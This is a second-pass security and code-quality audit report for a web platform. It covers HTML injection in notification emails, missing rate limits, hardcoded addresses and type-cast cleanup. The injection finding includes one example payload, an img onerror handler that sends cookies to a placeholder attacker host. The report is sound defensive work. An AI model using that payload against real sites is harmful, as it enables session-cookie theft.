# AlwaysReady Platform — Security, Bug & Code Quality Audit (Second Pass)
**Date:** 23 August 2026  
**Scope:** Full codebase re-audit following fixes from audit-report-2026-08-23.md  
**Result:** TypeScript passes clean. No hardcoded secrets. No new critical or high issues. Three medium/low findings. 

---

## Summary

| Severity | Count | Area |
|---|---|---|
| 🟡 Medium | 1 | HTML injection in admin notification emails |
| 🔵 Low | 2 | 4 public endpoints missing rate limiting; 3 hardcoded email addresses |
| 🔧 Quality | 2 | 16 remaining `as any` casts; 4 stale eslint-disable comments + 1 stale code comment |

---

## Security Findings

---

### 🟡 MEDIUM — HTML injection in admin notification emails

**Files:**
- `app/api/inbound-contact/route.ts` — `fullName`, `company`, `subject`, `message`
- `app/api/inbound-email/route.ts` — `displayName`, `cleanSubject`, `cleanBody`
- `app/api/inbound-demo/route.ts` — `serviceType`, `cqcRating`

User-controlled strings are interpolated directly into HTML email bodies without escaping. These emails go to AJ's inbox via the `SUPERADMIN_EMAIL` env var. A contact form submission with a crafted payload — for example a `message` field containing `<img src=x onerror="fetch('https://evil.example?c='+document.cookie)">` — would embed that HTML in the notification email AJ receives.

In practice, most email clients (Gmail, Outlook, Apple Mail) strip event handlers from email HTML, which limits the impact. But it's a real injection surface, and HTML structure can be broken in ways that degrade readability (injecting `</p>` tags, unclosed elements, etc.).

**Fix:** Add a small `escapeHtml()` helper and apply it to all user-controlled values before interpolation:

```typescript
function escapeHtml(s: string): string {
  return s
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
}
```

Then replace bare `${message}` with `${escapeHtml(message)}` etc. Only needed in the AJ notification email blocks — the auto-responders sent to the submitter themselves use plain values like `Hi ${displayName}` which are benign.

---

## Low Priority

---

### 🔵 LOW — 4 public POST endpoints missing rate limiting

**Files:**
- `app/api/inbound-contact/route.ts` — no limiter
- `app/api/inbound-demo/route.ts` — no limiter
- `app/api/inbound-optout/route.ts` — no limiter
- `app/api/blog-subscribe/route.ts` — has Turnstile (soft-pass), no hard limiter

The previous audit added rate limiting to `/api/inbound-waitlist`, `/api/inbound-blog-signup`, and `/api/cqc-lookup`. These four public endpoints were not in scope. All four trigger emails on receipt (AJ notifications, autoresponders, or both) and write to the database. An attacker could flood Resend quota, fill the support ticket queue, or spam the demo_leads / marketing_suppressions tables.

`blog-subscribe` has Turnstile, but currently soft-passes when no token is present — so it's not hard enforcement.

**Fix:** Apply the same `createRateLimiter` pattern from `lib/rate-limit.ts`. Suggested limits:
- `inbound-contact`: 5 requests/hr per IP (contact form)
- `inbound-demo`: 10 requests/hr per IP (pre-demo intake)
- `inbound-optout`: 10 requests/hr per IP (opt-out form)
- `blog-subscribe`: 10 requests/hr per IP (blog signup)

---

### 🔵 LOW — 3 hardcoded `hello@alwaysready.uk` email constants

**Files:**
- `app/api/inbound-demo/route.ts:24` — `const AJ_EMAIL = 'hello@alwaysready.uk'`
- `app/api/inbound-optout/route.ts:21` — `const AJ_EMAIL = 'hello@alwaysready.uk'`
- `app/api/inbound-zeeg/route.ts:21` — `const AJ_EMAIL = 'hello@alwaysready.uk'`

Every other route in the codebase reads `process.env.SUPERADMIN_EMAIL` for AJ's notification address. These three use a hardcoded constant instead. If the notification address changes, three files need updating rather than one env var change.

**Fix:** Replace with `process.env.SUPERADMIN_EMAIL ?? 'hello@alwaysready.uk'` — matches the pattern elsewhere and degrades gracefully if the env var isn't set.

---

## Code Quality Notes

---

### 16 remaining `as any` casts

The previous audit fixed 47 casts. 16 remain across 6 files:

| File | Count | Notes |
|---|---|---|
| `app/api/export-data/route.ts` | 6 | `(r: any)` in CSV-shaping lambdas. Supabase join results produce deeply nested inferred types; these would need explicit interface bridging to fix cleanly. |
| `app/api/stripe-webhook/route.ts` | 2 | `as any` for Stripe invoice object — the Stripe SDK doesn't expose the invoice subscription field directly. Justified, already eslint-disabled. |
| `app/api/report-pdf/route.ts` | 1 | `as any` for react-pdf JSX — library limitation. Justified. |
| `app/api/evidence-pack/route.ts` | 1 | Same react-pdf issue. Justified. |
| `app/dashboard/peoples-voice/page.tsx` | 1 | `(h: any)` in a Set deduplication. |
| Dashboard pages (feedback, governance, post-inspection ×2, incidents, reports) | 5 | `(r: any)` / `(a: any)` in join-result shaping lambdas, same pattern as export-data. |

The Stripe and react-pdf casts are genuine SDK limitations with no clean fix. The join-result lambdas (11 casts) are the same pattern as the ones fixed in `export-data` — they could be addressed by writing explicit interface types for the query return shapes and bridging with `as unknown as`. Not bugs, but inconsistent with the rest of the codebase post-cleanup.

---

### 4 stale `eslint-disable-next-line @typescript-eslint/no-explicit-any` comments

**Files:**
- `app/api/org-logo/route.ts` — lines 81, 112
- `app/api/report-snapshot/route.ts` — lines 51, 99

The previous session's type fixes removed the `as any` casts from these files but left the suppression comments. They now suppress nothing and should be deleted.

---

### Stale code comment in `org-logo/route.ts`

**Line 80:** `// Save to organisations table (logo_url not yet in generated types — migration pending)`

Migration `20260815000002_org_logo.sql` has been applied and `logo_url` is in `lib/types.ts`. The comment is stale.

---

## What's Good — Checked and Confirmed Clean

- **TypeScript** passes with zero errors across the entire codebase ✓
- **No hardcoded secrets** anywhere — all API keys and tokens read from `process.env` ✓
- **All superadmin server actions** have `assertSuperadmin()` as the first call ✓
- **All 6 cron routes** verify `CRON_SECRET` via `Authorization: Bearer` header and fail-closed ✓
- **`inbound-zeeg`** is fail-closed — fixed in the previous audit ✓
- **`inbound-email`** is fail-closed: `!secret || provided !== secret` ✓
- **`upload-evidence`** uses magic-byte MIME inspection (not just browser `Content-Type`) + Cloudmersive virus scan ✓
- **`org-logo`** no longer accepts SVG — fixed in the previous audit ✓
- **`deleteOrganisation`** — tables not in the manual delete list (`action_items`, `incidents`, `hr_absence_records`, `saved_report_views`, `report_snapshots`, etc.) all have `ON DELETE CASCADE` on their `organisation_id` FK in their migrations. Step 5 (org delete) cascades to them safely ✓
- **Middleware MFA enforcement** now covers both `admin` and `user` (staff) roles ✓
- **All dashboard queries** scope to `organisation_id` from the server-side session ✓
- **Rate limiting** on `/api/inbound-waitlist`, `/api/inbound-blog-signup`, `/api/cqc-lookup`, `/login` ✓
- **Campaign tables** now have RLS with deny-all for authenticated role ✓
- **`export-data`** scopes all queries to the authenticated user's `organisation_id` ✓
- **No cross-org data leakage** found in any route ✓

---

## Recommended Action Order

1. **Add `escapeHtml()` and apply to notification email bodies** in `inbound-contact`, `inbound-email`, `inbound-demo`. (30 mins)
2. **Add rate limiting** to the 4 unprotected public endpoints. (20 mins)
3. **Replace hardcoded `AJ_EMAIL`** with `process.env.SUPERADMIN_EMAIL` in the 3 files. (5 mins)
4. **Remove 4 stale `eslint-disable` comments** and the stale comment in `org-logo`. (5 mins)
5. **Address remaining `as any` casts** in dashboard pages and `export-data` — lower priority, no security impact. (1–2 hrs)
